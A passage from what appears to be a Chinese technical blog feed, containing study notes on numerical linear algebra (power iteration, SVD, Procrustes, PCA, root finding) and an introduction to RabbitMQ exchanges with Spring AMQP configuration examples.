id="5-5-Application-Use-Matrices-to-Solve-Problems"><a href="#5-5-Application-Use-Matrices-to-Solve-Problems" class="headerlink" title="5.5 Application: Use Matrices to Solve Problems"></a>5.5 Application: Use Matrices to Solve Problems</h2><ul><li><p>例如 $\vec{y}^\prime=\lambda\vec{y}$，可以看成一个求导变换 $D\vec{y}=\lambda\vec{y}$，求 $D$ 的特征向量就是 $\vec{y}$ 的解；</p></li><li><p>照片曝光的例子：数据集中有 $n$ 个数据，$\omega_{ij}\ge0$ 表示第 $i$ 和 $j$ 数据集之间的某个指标的相似性，$\omega_{ij}=\omega_{ji}$；我们想将这些数据集以这个指标 $x_i$ 衡量起来，要求相似性越高的数据，$x_i$ 的值也应该相近；</p><p>为了完成这个任务，可以定义一个目标函数 $\sum\limits_{ij}\omega_{ij}(x_i-x_j)^2$，对它最小化优化就行。</p><p>但是需要一些限制条件，防止 $x_i\equiv const$ 无意义的情况，例如 2-范数为 1 $||\vec{x}||_2^2=1$（归一化）、$\vec{1}\cdot\vec{x}=0$（指标 $x_i$ 均值为 0，方便统计）；</p><p>所以目标函数可以简化为：$2x^T(A-W)x$，其中 $W=(\omega_{ij})_{n\times n}$；找到 $A-W$ 的第二小特征值（最小特征值是 0，已经被限制条件排除了）对应的特征向量就是解。</p></li></ul><ul><li>计算 $A^k$：</li></ul><p>对一个实对称阵 $A$，假设其特征值 $\lambda_1,\ldots,\lambda_n$ 从大到小排列（$\lambda_{i+1}\ge\lambda_{i}$），那么它由实对称阵特征向量的完备性，我们可以用 $A$ 特征向量 $(x_1,\ldots,x_n)$ 来表示任意 $n$ 维向量：$A\vec{v}=c_1A\vec{x_1}+\cdots+c_nA\vec{x_n}=c_1\lambda_1\vec{x_1}+\cdots+c_n\lambda_n\vec{x_n}$（和量子力学将力学量使用它对应的算符的本征函数展开是一样的）；</p><p>因此我们发现，$A^k$ 对 $\vec{v}$ 作用的效果就取决于最大的特征值及其特征向量了：</p><p><img src="imgs2/spec.png" width="500px"></p><p>$A^k\vec{v}\approx c_1\lambda_1^k\vec{x_1},\space\text{assume that}\space c_1\ne0,\lambda_1\gt\lambda_2$（$k$ 要求足够大）；</p><blockquote><p>问题是，如果 $|\lambda_1|\gt1$ 时，$A^k\vec{v}\rightarrow\infty$，所以每次迭代都做一次归一化即可：</p><p>$\vec{\omega_k}=A\vec{v_{k-1}},\space\text{ where }\vec{\omega_{k}}=\dfrac{\vec{v_{k-1}}}{||\vec{v_{k-1}}||}$；</p><p>所以通过这个 power iteration 方法我们就能估计出 $A$ 的最大特征值；</p></blockquote><p>又注意到 $A$ 特征值的倒数，<strong>正好是</strong> $A^{-1}$ 对应的特征值：$A\vec{v}=\lambda\vec{v}\Rightarrow A^{-1}\vec{v}=\dfrac{1}{\lambda}\vec{v}$；</p><p>那么对 $A^{-1}$ 进行 power iteration，就能得到 $A$ 的最小特征值。</p><blockquote><p>$A^{-1}$ 的 power iteration 可以借助 $LU$ 分解加速。</p></blockquote><p>另外，由于正确结果收敛较慢，因此我们可以使用 “shifted inverse iteration”：</p><p>$A\vec{v}=\lambda\vec{v}\Rightarrow(A-\sigma I)\vec{v}=(\lambda-\sigma)\vec{v}$，可以得到如下的迭代过程（猜测 $\sigma_k\approx\lambda_k$）：</p><script type="math/tex; mode=display">\vec{\omega_k}=(A-\sigma_k I)^{-1}\vec{v_{k-1}},\space\vec{v_k}=\dfrac{\vec{\omega_k}}{||\vec{\omega_k}||},\space \sigma_{k+1}=\dfrac{\vec{v_{k}}^TA\vec{v_k}}{||\vec{v_k}||_2^2}</script><h2 id="5-6-Similarity-Transformations"><a href="#5-6-Similarity-Transformations" class="headerlink" title="5.6 Similarity Transformations"></a>5.6 Similarity Transformations</h2><ul><li><p>借助 QR 分解进行相似变换：$A=QR$，则 $Q^{-1}AQ=RQ$，所以可以迭代：$A_{k+1}=R_kQ_k,\space A_k=Q_kR_k$；</p><p>好的结论：$A_\infty=Q_\infty R_\infty=R_\infty Q_\infty$；</p></li></ul><h2 id="5-7-SVD-Singular-Value-Decomposition"><a href="#5-7-SVD-Singular-Value-Decomposition" class="headerlink" title="5.7 SVD (Singular Value Decomposition)"></a>5.7 SVD (Singular Value Decomposition)</h2><p>回忆一个矩阵的诱导范数：</p><script type="math/tex; mode=display">||A||=\max_{\vec{x}\ne0}\dfrac{||A\vec{x}||}{||\vec{x}||}=\max\limits_{||\vec{x}||=1}||A\vec{x}||</script><p>注意到 $||\vec{v}||=1$ 时，$||A||^2=||A\vec{v}||^2=\vec{v}A^TA\vec{v}$，因此只需要</p><p>特征值只有方阵才能讨论。有没有一种研究矩阵更普遍特征性质的分解呢？它就是奇异值分解。</p><p>可以证明，任何矩阵可以分解为：$A=U\Sigma V^{-1}$，其中 $U,V$ 为正交矩阵，$\Sigma$ 为对角矩阵（可以不是方阵）；</p><p>在物理上 $U,V$ 表示旋转变换（rotation），$\Sigma$ 表示伸缩变换（scale）；</p><p>那么 $U$、$V$ 代表什么？</p><p>我们发现：$A^TA=V(\Sigma^T\Sigma)V^T$，显然 $\Sigma^T\Sigma$ 是个对角方阵。而 $A^TA$ 有很好的性质：它是半正定、对称矩阵。</p><p>因此我们惊喜地发现，这就相当于对 $A^TA$ 完成了相似对角化。$\Sigma^T\Sigma$ 对角元存放的是 $A^TA$ 的特征值，$V$ 的列存放的是 $A^TA$ 对应的特征向量；</p><p>同理，$AA^T=U(\Sigma^T\Sigma)U^T$，所以，我们得出以下结论：</p><ul><li>$U$ 和 $V$ 分别是 $AA^T$ 和 $A^TA$ 的归一化特征向量组成的正定矩阵；</li><li>$U$ 和 $V$ 特征值<u>按序相同</u>（从大到小排列），对于实矩阵而言都大于等于 0；</li></ul><p>SVD 分解还可以写成一系列 $U,V$ 向量的外积线性组合：$A=\sum\sigma_i\vec{u_i}\vec{v_i}^T$；</p><p>SVD 可以有哪些用处？比如定义一个一般矩阵的 “伪逆”（pseudo inversion）：</p><script type="math/tex; mode=display">A^{+}=V\Sigma^{+}U^T</script><p>注意，对不一定为方阵的对角阵的伪逆：$\Sigma^{+}$ 就是将 $\Sigma$ 对角元的元素求倒数，放在对角位置，并且转置矩阵的长宽。</p><p>伪逆有一些很好的性质：</p><ul><li>当 $A$ 为可逆方阵时，$A^+=A^{-1}$；</li><li>当 $A$ 的行秩大于列秩时（overdetermined），$A^+\vec{b}$ 给出了最小二乘结果；</li><li>当 $A$ 的列秩大于行秩时（underdetermined），$A^+\vec{b}$ 给出了 $A\vec{x}\approx\vec{b}$ 的最小二乘结果；</li></ul><h3 id="5-7-1-Application-Orthogonal-Procrustes-Theorem"><a href="#5-7-1-Application-Orthogonal-Procrustes-Theorem" class="headerlink" title="5.7.1 Application: Orthogonal Procrustes Theorem"></a>5.7.1 Application: Orthogonal Procrustes Theorem</h3><p>考虑一个问题：将一组向量 $A$ 通过正交变换的方式映射到新的一组向量 $QA$，让这组新的向量与给定的一组向量 $B$ 的差异尽可能的小（使用 Frobenius 范数衡量）。这在图像处理领域比较常用。</p><p>用数学方法表达就是，求正交阵：$\hat{Q}=\arg\min\{||QA-B||_{F}\}$（易知，$A,B$ 规模相同）；</p><p>由于 Frobenius 范数可以表达为 $||C||_F=\sqrt{\mathrm{tr}(C^TC)}$，故上式可计算：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\min\{\mathrm{tr}((QA-B)^T(QA-B))\}\\&=\arg\min\{\mathrm{tr}(((QA)^T-B^T)(QA-B))\}\\&=\arg\min\{\mathrm{tr}((A^TQ^T-B^T)(QA-B))\}\\&=\arg\min\{\mathrm{tr}(A^TQ^TQA-BA^TQ^T-B^TQA+B^TB)\}\\&=\arg\min\{\mathrm{tr}(A^TA+B^TB-A^TQ^TB-(A^TQ^TB)^T)\}\\&=\arg\min\{\mathrm{tr}(A^TA)+\mathrm{tr}(B^TB)-2\mathrm{tr}(A^TQ^TB)\}\\\end{aligned}</script><p>注意到前两项在确定问题时就已知，所以最小化问题直接转换为最大化问题：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\max\{\mathrm{tr}(A^TQ^TB)\}\\&=\arg\max\{\mathrm{tr}(Q^TBA^T)\}\\\end{aligned}</script><p>（注意 $\mathrm{tr}(PQ)=\mathrm{tr}(QP)$）</p><p>下面利用 SVD 分解做一个巧妙变换（假设 $BA^T=U\Sigma V^T$）：</p><script type="math/tex; mode=display">\begin{aligned}\hat{Q}&=\arg\max\{\mathrm{tr}(Q^TBA^T)\}\\&=\arg\max\{\mathrm{tr}(Q^TU\Sigma V^T)\}\\&=\arg\max\{\mathrm{tr}(V^TQ^TU\Sigma)\}\\\end{aligned}</script><p>这样 $V,Q,U$ 都是正交阵，所以 $V^TQ^TU$ 也是正交阵。</p><p>可以简单地证明，$\mathrm{tr}(QA)$ 最大（$Q$ 正交阵）时，$Q=I$；</p><p>此时 $\hat{Q}^T=VU^T$，$\hat{Q}=UV^T$；</p><p>所以这里我们利用 SVD 解出了正交普鲁克定理：</p><p>当 $Q=UV^T$（其中 $BA^T=U\Sigma V^T$）时，$||QA-B||_F$ 有最小值。</p><h3 id="5-7-2-Application-Principal-Component-Analysis-PCA"><a href="#5-7-2-Application-Principal-Component-Analysis-PCA" class="headerlink" title="5.7.2 Application: Principal Component Analysis (PCA)"></a>5.7.2 Application: Principal Component Analysis (PCA)</h3><p>再考虑一个问题，对于相当大的一个数据集，它包含很多维度，我们基于以下目的需要降维：</p><ul><li>使得数据集更易使用；</li><li>降低算法的计算开销；</li><li>去除噪声；</li><li>使得结果容易理解；</li></ul><p>有一种降维方法就是主成分分析方法（PCA），其主要思想是将 $n$ 维特征映射到 $k$ 维上，这k维是全新的正交特征也被称为主成分，是在原有 $n$ 维特征的基础上重新构造出来的 $k$ 维特征；</p><p>可以证明：</p><p>最小化 $||X-CC^TX||_F$（其中 $C\in\mathbf{R^{n\times k}}$，$C^TC=I_{k\times k}$，$C$ 是 $U$ 的前 $k$ 列向量，$X=U\Sigma V^T$）取得的 $C$ 就是 $X$ 的主成分。</p><h1 id="Chapter-6-Non-linear-System"><a href="#Chapter-6-Non-linear-System" class="headerlink" title="Chapter 6. Non-linear System"></a>Chapter 6. Non-linear System</h1><h2 id="6-1-Root-Finding"><a href="#6-1-Root-Finding" class="headerlink" title="6.1 Root Finding"></a>6.1 Root Finding</h2><p>作出一些假设：</p><ul><li><p>连续性；</p><blockquote><p>连续函数满足的定理：中值定理；</p></blockquote></li><li><p>Lipschitz 特性：绝对值增长速率不快于一阶线性函数；</p></li><li><p>$k$ 阶导存在且连续；</p></li></ul><p><strong><u>方法一：二分法（bisection）</u></strong>，利用中值定理锁定根的区间（高中内容），直到根的区间小于一定范围就停止迭代。</p><ul><li><p>优点：无条件收敛（unconditionally converge）；</p><blockquote><p>收敛速度？指数速度减小。</p><p>$|x-x^*|\lt E_k$，其中 $E_k$ 为第 $k$ 轮迭代时的区间宽度（$E_k\le\dfrac{1}{2}E_{k-1},\space E_k=|r_k-l_k|$）；</p></blockquote></li><li><p>缺点：对函数性质要求严格。</p></li></ul><p><strong><u>方法二：不动点法（fixed point）</u></strong>，通过迭代求解 $g(x^<em>)=x^</em>$ 来得到 $f(x)=g(x)-x$ 的零点。</p><p>怎么迭代？方法比较多，但是常用的是最简单的策略：</p><p>simple strategy：将 $g(x_{k-1})$ 作为下一轮迭代的 $x_k$ 的值，直至 $|g(x_k)-x_k|$ 小于一定范围；</p><ul><li><p>优点：计算简单；</p></li><li><p>缺点：$g$ 必须满足 Lipschitz 特性，或者在根 $x^*$ 及迭代范围附近满足 Lipschitz 局部特性，否则迭代发散。</p><blockquote><p>对于满足 Lipschitz 特性的情况，$E_k\le cE_{k-1}$（linear）；</p><p>对于其他一般情况：$E_k=|x_k-x^<em>|=|g(x_{k-1})-g(x^</em>)|\le\dfrac{1}{2}(|g^{\prime\prime}(x^*)|+\varepsilon)E_{k-1}^2$（quadratic）； </p></blockquote></li></ul><p><strong><u>方法三：牛顿法（Newton’s method）</u></strong>，这个方法作出了一个假设，认为函数在零点附近近似线性，可以给出一个猜测值 $x_0$，求该点处切线 $l_0$，取得 $l_0$ 与 x 轴交点为 “更接近零点的点” $x_1$，重复迭代直至稳定。</p><script type="math/tex; mode=display">x_{k+1}=x_k-\dfrac{f(x_k)}{f^\prime(x_k)}</script><p>可以看作求 $g(x)=x-\dfrac{f(x_k)}{f^\prime(x_k)}$ 的不动点。</p><ul><li>优点：在简单情况下收敛很快；</li><li>缺点：<ol><li>$g$ 需要满足局部 Lipschitz 特性，否则不收敛（收敛速度和不动点法同理）；</li><li>$f^\prime(x^*)\ne0$，否则永远无法得到正确解；</li><li>某些函数难以求导数。</li></ol></li></ul><p><strong><u>方法四：割线法（secant method）</u></strong>，利用两相近点间的割线近似为切线的思想（$f^\prime(x)\approx\dfrac{f(x_1)-f(x_2)}{x_1-x_2},\space |x_1-x_2|\rightarrow0$），可以借助两次猜测的点的连线（割线）视作切线：$f^\prime(x_k)\approx\dfrac{f(x_k)-f(x_{k-1})}{x_k-x_{k-1}}$，结合牛顿法解决：</p><script type="math/tex; mode=display">x_{k+1}=x_k-\dfrac{f(x_k)}{f^\prime(x_k)}\approx x_k-\dfrac{f(x_k)(x_k-x_{k-1})}{f(x_k)-f(x_{k-1})}</script><ul><li>优点：计算稍微简单一点；</li><li>缺点：和牛顿法一样存在收敛问题。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Chapter-1-Basic-Concepts&quot;&gt;&lt;a href=&quot;#Chapter-1-Basic-Concepts&quot; class=&quot;headerlink&quot; title=&quot;Chapter 1. Basic Concepts&quot;&gt;&lt;/a&gt;Chapter 1. Ba</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Math" scheme="https://blog.sjtuxhw.top/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Rabbit MQ</title>
    <link href="https://blog.sjtuxhw.top/technical/rabbit-mq/"/>
    <id>https://blog.sjtuxhw.top/technical/rabbit-mq/</id>
    <published>2024-06-01T08:31:33.000Z</published>
    <updated>2024-10-25T13:59:32.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-0-背景"><a href="#Chapter-0-背景" class="headerlink" title="Chapter 0. 背景"></a>Chapter 0. 背景</h1><h2 id="0-1-同步消息和异步消息"><a href="#0-1-同步消息和异步消息" class="headerlink" title="0.1 同步消息和异步消息"></a>0.1 同步消息和异步消息</h2><p>微服务架构下存在很多服务间相互调用的情况。</p><p>我们知道可以通过 <code>OpenFeign</code> 的方式来获取远程服务的响应，但是 <code>OpenFeign</code> 的远程调用是同步的，其优点是同步调用时效强，等待结果返回。但同时会导致：</p><ul><li>代码可扩展性差。</li><li>性能堪忧。相较于相同项目实现的单体架构，同步的微服务调用方式会多出网络等待时间。</li></ul><p>于是我们需要异步调用的方式，这里使用到了<strong>发布-订阅者模式</strong>。</p><p>异步调用的优势是，</p><ul><li>模块间进一步解耦（发布者和订阅者间无需知道相互之间的信息）；</li><li>可拓展性强（scalable），添加实例无需更改代码；</li><li>异步性能有明显提升；</li><li>故障隔离（<strong><u>最终一致性保证</u></strong>）；</li><li>缓存消息，实现流量削峰填谷；</li></ul><p>但是缺点也很明显：</p><ul><li>异步实现无法立即得到结果，时效性差，可能导致数据不一致性；</li><li>不作额外措施，则不能保证最终一致性（下游业务是否成功）。所以业务安全依赖于 broker 的可靠性；</li></ul><h2 id="0-2-Message-Queue-选型"><a href="#0-2-Message-Queue-选型" class="headerlink" title="0.2 Message Queue 选型"></a>0.2 Message Queue 选型</h2><div class="table-container"><table><thead><tr><th>Opt</th><th>RabbitMQ</th><th>ActiveMQ</th><th>RocketMQ</th><th>Kafuka</th></tr></thead><tbody><tr><td>Company</td><td>Rabbit（专一，社区极活跃）</td><td>Apache（大厂支持）</td><td>Alibaba（开源冲业绩）</td><td>Apache</td></tr><tr><td>Language</td><td>Erlang（面向并发的语言）</td><td>Java</td><td>Java</td><td>Scala&amp;Java</td></tr><tr><td>Protocol Support</td><td>AMQP,XMPP,SMTP,STOMP</td><td>OpenWire,STOMP,REST,XMPP,AMQP</td><td>私有协议，只能被 Java 调用（微服务语言限制）</td><td>私有协议</td></tr><tr><td>Availability</td><td>高</td><td>一般</td><td>高</td><td>高</td></tr><tr><td>Monolith Throughput（ops）</td><td>一般（数十万上下）</td><td>差</td><td>高（数十万）</td><td>极高（近数百万）</td></tr><tr><td>Latency</td><td>微秒级</td><td>毫秒级</td><td>毫秒级</td><td>毫秒以内</td></tr><tr><td>Reliability</td><td>高</td><td>一般</td><td>高</td><td>一般</td></tr></tbody></table></div><p>可以看出：</p><ul><li><p><code>Kafuka</code> 牺牲了部分可靠性（只确保最终一致性）、消息延迟，换取了极高的消息吞吐量。在对消息准确性要求不高（如日志传输）的情况下推荐；</p></li><li><p><code>RocketMQ</code> 虽然功能丰富，但是 <code>Alibaba</code> 的开源项目大多属于冲业绩，文档和社区支持不佳。</p><p>此外 <code>RocketMQ</code> 依赖于很多 <code>Alibaba</code> 技术栈，如果项目中不打算或者没有 <code>Alibaba</code> 的依赖，那么引入困难；</p><p>另外 <code>RocketMQ</code> 不支持主流协议，只支持他们自己的一套接口，微服务语言局限于 Java；</p></li><li><p><code>ActiveMQ</code> 是早期的项目，指标不如后辈；</p></li></ul><p>因此我们选择 <code>RabbitMQ</code>。</p><h1 id="Chapter-1-Introduction-to-RabbitMQ"><a href="#Chapter-1-Introduction-to-RabbitMQ" class="headerlink" title="Chapter 1. Introduction to RabbitMQ"></a>Chapter 1. Introduction to <code>RabbitMQ</code></h1><h2 id="1-1-架构"><a href="#1-1-架构" class="headerlink" title="1.1 架构"></a>1.1 架构</h2><p><img src="imgs/arch2.png"></p><ul><li><p><code>queue</code>：暂时存储消息的消息队列；队列有两类：</p><ul><li><p>durable queue：持久化队列，信息会被定期持久化到磁盘。这种队列可以提升可靠性，但是会降低性能；</p></li><li><p>non-durable queue：非持久化队列，信息总是保存在内存中。这种队列的速度会快于 durable queue，但是可靠性无法保证（例如不保证掉电不丢失数据）；</p></li></ul></li><li><p><code>virtual host</code>：虚拟主机，起到不同项目数据隔离作用；</p></li><li><p><code>exchange</code>：路由消息的交换机。其作用是接受发布者发送的消息，并将接收到的消息<strong><u>按照交换机的配置</u></strong>路由到所有与其绑定的队列中。本身不具备消息暂存能力；</p><p>交换机的配置（种类，或者说<strong>路由策略</strong>）大致有几种：</p><ul><li><p><code>Fanout</code>（广播）：<code>Fanout</code> 交换机。会将自身接受到的消息批量路由到<strong>所有与之关联的</strong>消息队列中；</p></li><li><p><code>Direct</code>（定向）：<code>Direct</code> 交换机。这种交换机 与 消息队列的关联时需要额外指定一个 <code>bindingKey</code>，并且发布者在向该种交换机发送消息时，必须指定 <code>routingKey</code>。</p><p>于是这种交换机只会将接受到的消息发送给 <code>bindingKey</code> 与这条消息的 <code>routingKey</code> 相同的消息队列中；</p><blockquote><p><code>bindingKey</code> 不要求对于交换机唯一。所以理论上 <code>Direct</code> 交换机的功能覆盖了 <code>Fanout</code> 交换机。</p></blockquote></li><li><p><code>Topic</code>（话题，类似 <code>Kafuka</code> 的按 Topic 订阅）：与 <code>Direct</code> 交换机类似，也以 <code>bindingKey</code> 和 <code>routingKey</code> 为路由依据，但：</p><ul><li><code>bindingKey</code> 这里是 topic，可以使用通配符：<code>#</code> 代表 0 到多个 topic，<code>*</code> 代表 1 个 topic；</li><li><code>routingKey</code> 可以是 topic 的组合，使用 <code>.</code>（period）隔开；</li></ul></li><li><p><code>Headers</code>（请求头）：<code>Headers</code> 交换机，</p></li></ul></li></ul><p>注意，交换机 和 消息队列间的关联需要显式声明 / 配置。</p><h2 id="1-2-Spring-AMQP"><a href="#1-2-Spring-AMQP" class="headerlink" title="1.2 Spring AMQP"></a>1.2 Spring <code>AMQP</code></h2><p><code>RabbitMQ</code> 支持多种协议，其中就包括 <code>AMQP</code>（Advanced Message Queuing Protocol），其他各种语言都有各自的 <code>AMQP</code> 的实现库。</p><p>为了方便起见，在 Spring 项目中常常使用 Spring 框架中实现好的 <code>AMQP</code> 协议接口来完成任务。</p><blockquote><p><code>spring-boot-starter-amqp</code> 依赖内部提供了针对 <code>AMQP</code> 协议的实现，只需引入该依赖即可操作 <code>RabbitMQ</code>；</p><p>引入后需要进行一些配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">port:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">virtual-host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">username:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">...</span></span><br></pre></td></tr></table></figure></blockquote><ul><li>最简单使用：<code>RabbitTemplate.convertAndSend</code> &amp; <code>@RabbitListener</code>；</li></ul><h3 id="1-2-1-Working-Queues-模型"><a href="#1-2-1-Working-Queues-模型" class="headerlink" title="1.2.1 Working Queues 模型"></a>1.2.1 Working Queues 模型</h3><p>Working Queues 模型：多个消费者绑定到一个队列，共同消费队列中的消息；</p><ul><li>结论 1：队列中的消息<strong><u>最多只能被消费一次</u></strong>；所以多个 consumer 监听的情况下，一个消息被某个 consumer 消费后，不会存在于消费队列中被其他 consumer 消费（不存在消息重复）；</li><li>结论 2：队列传递给所有监听它的消费者的<strong><u>默认行为</u></strong>是绝对平均（<strong>轮询</strong>）的，没有考虑到各个机器消费消息的性能（可以用 <code>Thread.sleep</code> 测试）；</li></ul><p>为了改善这个模型下出现的问题，我们可以对这个默认的轮询机制调优：<u>规定每个消费者一次只能获取一条消息，处理完成后才能获取下一条消息</u>；</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在消费者（使用 `@RabbitListener` 注解）所在的模块中配置</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">rabbitmq:</span></span><br><span class="line">        <span class="attr">listener:</span></span><br><span class="line">            <span class="attr">simple:</span></span><br><span class="line">                <span class="attr">prefetch:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="1-2-2-Fanout-Exchange"><a href="#1-2-2-Fanout-Exchange" class="headerlink" title="1.2.2 Fanout Exchange"></a>1.2.2 <code>Fanout</code> Exchange</h3><p>为什么需要广播交换机？考虑一个问题，假设一个发布者发布消息后，我们的业务逻辑要求同时有多个其他服务需要接收这个消息并且执行相应逻辑。举个例子，<code>consumer1</code> 和 <code>consumer2</code> 需要在 <code>publisher</code> 发送消息后各自接收一次消息（也就是都执行一次业务逻辑）。</p><p>如果没有广播交换，那么发布者发布的消息在全局范围内只能被一个消费者消费，这就没法实现多个服务都接受到发布者消息的需求了。</p><p>在这种需求下，我们只需要为每个微服务建立一个消息队列，并且对应监听；将这些队列与一个公共的 <code>fanout</code> 交换机关联，就能完成上面的需求。如下图所示：</p><p><img src="imgs/fanout.png"></p><blockquote><p>代码中，如果使用了 <code>fanout</code> 交换机，那么 <code>routingKey</code> 可以指定为空字符串 / <code>null</code>；</p></blockquote><h3 id="1-2-3-Direct-Exchange"><a href="#1-2-3-Direct-Exchange" class="headerlink" title="1.2.3 Direct Exchange"></a>1.2.3 <code>Direct</code> Exchange</h3><ul><li>路由交换机需要与消息队列以 <code>bindingKey</code> 绑定；一个交换机和一个消息队列可以绑定多个 <code>bindingKey</code>；</li><li><p><code>bindingKey</code> 和 <code>routingKey</code> 不存在通配符；</p></li><li><p>路由直接发送到 <code>bindingKey == routingKey</code> 的消息队列中；</p></li></ul><h3 id="1-2-4-Topic-Exchange"><a href="#1-2-4-Topic-Exchange" class="headerlink" title="1.2.4 Topic Exchange"></a>1.2.4 <code>Topic</code> Exchange</h3><ul><li>路由交换机需要与消息队列以 <code>bindingKey</code> 绑定；</li><li><code>bindingKey</code> 允许通配符，<code>#</code> 表示任意 0 至多个 topic，<code>*</code> 表示任意一个；</li><li>路由发送到所有匹配的消息队列中；</li></ul><h3 id="1-2-5-Spring-AMQP-声明交换机-amp-队列"><a href="#1-2-5-Spring-AMQP-声明交换机-amp-队列" class="headerlink" title="1.2.5 Spring AMQP 声明交换机 &amp; 队列"></a>1.2.5 Spring <code>AMQP</code> 声明交换机 &amp; 队列</h3><ul><li><code>Queue</code> 声明队列的类，也可以使用 <code>QueueBuilder</code> 工厂类创建；</li><li><code>Exchange</code> 声明交换机的类，也可以使用 <code>ExchangeBuilder</code> 工厂类创建；</li><li><code>Binding</code> 声明队列和交换机的绑定关系，<code>BindingBuilder</code>（常用）；</li></ul><h4 id="Method-1-Spring-Bean-Configuration-式声明"><a href="#Method-1-Spring-Bean-Configuration-式声明" class="headerlink" title="Method 1. Spring Bean Configuration 式声明"></a>Method 1. Spring Bean Configuration 式声明</h4><p>举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 通常在 consumer 段声明，因为 consumer 更需要关注交换机和队列的生成 */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FanoutConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FanoutExchange <span class="title function_">fanout</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">/* 构造函数为名称 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">FanoutExchange</span>(<span class="string">&quot;test.fanout&quot;</span>);</span><br><span class="line">        <span class="comment">/* 等价于： */</span></span><br><span class="line">        <span class="comment">/* return ExchangeBuilder.fanoutExchange(&quot;test.fanout&quot;).build(); */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fQueue1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;test.queue1&quot;</span>);</span><br><span class="line">        <span class="comment">/* 等价于（默认 durable queue）： */</span></span><br><span class="line">        <span class="comment">/* return QueueBuilder.durable(&quot;test.queue1&quot;).build(); */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Queue <span class="title function_">fQueue2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Queue</span>(<span class="string">&quot;test.queue2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 自动注入 queue 和 exchange，从上面的 bean 寻找，采用 autowired-by-name 策略 */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingQueue</span><span class="params">(Queue fQueue1, FanoutExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fQueue1).to(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Binding <span class="title function_">bindingQueue</span><span class="params">(Queue fQueue2, FanoutExchange exchange)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fQueue2).to(exchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Method-2-Listener-注解式声明"><a href="#Method-2-Listener-注解式声明" class="headerlink" title="Method 2. Listener 注解式声明"></a>Method 2. Listener 注解式声明</h4><p>显然这种方法非常麻烦，主要有以下的问题：</p><ul><li><p>每个方法大同小异，大部分是 boilerplate code；</p></li><li><p>定义步骤相当繁琐每定义一个队列、交换机或者绑定关系，就要新建一个方法；</p></li><li>很多队列或者交换机的 bean，只能通过 <code>autowired-by-name</code> 的方法注入，降低了代码可读性和可维护性；</li></ul><p>于是可以使用另一种定义方式，直接使用 <code>@RabbitListener</code> 提供的 <code>bindings</code> 参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(</span></span><br><span class="line"><span class="meta">    bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">        value = @Queue(value = &lt;Queue Name&gt;, [durable = &quot;true&quot; | &quot;false&quot;]),</span></span><br><span class="line"><span class="meta">        exchange = @Exchange(value = &lt;Exchange Name&gt;, type = ExchangeTypes.?),</span></span><br><span class="line"><span class="meta">        key = &#123; /* 